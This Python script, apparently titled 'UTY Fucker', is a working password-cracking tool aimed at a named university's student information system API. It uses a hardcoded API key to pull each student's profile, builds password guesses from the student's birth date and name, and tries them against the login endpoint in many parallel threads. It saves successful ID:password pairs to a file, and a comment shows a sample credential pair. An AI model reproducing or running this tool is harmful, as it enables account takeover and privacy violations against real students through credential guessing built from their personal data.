import json
import datetime
from colorama import *
import requests as req
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor

key = "SF27xMjAL178GOUgDoQ1GzL6v4jGk99H"
live = []

def profil(nim):
	raw = req.get("http://api-sia.uty.ac.id/profil",headers={"nim":f"{nim}","q":key}).json()["SIA_RestAPI"]
	return raw

def buka(filepath):
	empass = open(filepath).read().splitlines()
	return empass

def cek(empas):
	url = "http://api-sia.uty.ac.id/login"
	dat = empas.split(":")
	nim = dat[0]
	pwd = dat[1]
	hdr = {"u":nim,"p":pwd,"q":key}
	raw = req.get(url,headers=hdr).json()['SIA_RestAPI']
	
	if raw['status']:
		print(f"{Style.RESET_ALL} > {Fore.GREEN}{nim}{Style.RESET_ALL}:{Fore.GREEN}{pwd}{Fore.BLACK}{Back.BLACK}"+"-"*10)
		open('live.txt','a').write(f'{nim}:{pwd}\n')
		live.append(nim)
	else:
		print(end=f"{Style.RESET_ALL} - [{Fore.RED}{nim}{Style.RESET_ALL}] {Style.DIM}{pwd}\r")

def convert(tanggal,nim):
	tgl,bln,thn = tanggal.split(" ")
	objek_bulan = datetime.datetime.strptime(bln, "%B")
	angka_bulan = objek_bulan.month
	return f"{tgl}{angka_bulan:02d}{thn}"

def main():
	print(f"\n\n     {Back.WHITE}{Fore.BLACK} UTY Fucker by YutixCode {Style.RESET_ALL}\n\n")
	print("[1] crack from nim \n"+
	"[2] check live empas\n")
	
	pilih = input("Yutix >> ")
	
	if pilih == "1":
		items = buka(input("Filepath >> "))
		thrds = int(input("Threads >> "))
		#thrds = 50
		#items = buka("live.txt")
		print()
		with ThreadPoolExecutor(max_workers=thrds) as yutix:
			for nim in items:
				try:
					tmp = []
					dat = profil(nim)["result"]["profile"]
					tmp.append(nim)
					tmp.append(dat["ttl"].split(", ")[0])
					tmp.append(convert(dat["ttl"].split(", ")[1],nim))
					for i in dat["nama_lengkap"].split(" "):
						tmp.append(i+'123')
						tmp.append(i)
					
					for i in tmp:
						yutix.submit(cek,f"{nim}:{i}")
				except Exception as err:
					#print(err)
					pass
		print(f"{Fore.BLACK}{Back.BLACK}"+"-"*25)
		print(f"{Style.RESET_ALL}Live: {Fore.GREEN}{len(live)}")
	elif pilih == "2":
		items = buka(input("Filepath >> "))
		thrds = int(input("Threads >> "))
		#thrds = 50
		#items = buka("live")
		print()
		with ThreadPoolExecutor(max_workers=thrds) as yutix:
			for empas in items:
				try:
					yutix.submit(cek,f"{empas}")
				except Exception as err:
					print(err)
					#pass
		print(f"{Fore.BLACK}{Back.BLACK}"+"-"*25)
		print(f"{Style.RESET_ALL}Live: {Fore.GREEN}{len(live)}")

#cek("5201711076:15091999")
main()